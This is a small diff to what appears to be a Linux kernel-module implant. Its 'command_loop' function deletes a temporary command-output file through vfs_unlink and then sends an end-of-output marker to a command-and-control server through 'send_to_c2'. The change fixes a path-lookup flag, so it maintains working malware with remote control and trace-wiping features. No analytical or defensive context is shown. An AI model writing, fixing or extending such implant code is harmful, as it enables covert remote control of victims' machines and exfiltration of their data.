@@ -178,7 +178,7 @@ static int command_loop(void *data) {
             filp_close(f, NULL);
 
             struct path path;
-            if (kern_path(tmp_output_path, LOOKUP_REMOVE, &path) == 0)
+            if (kern_path(tmp_output_path, 0, &path) == 0)
                 vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
         }
         send_to_c2("--EOF--\n", 8);
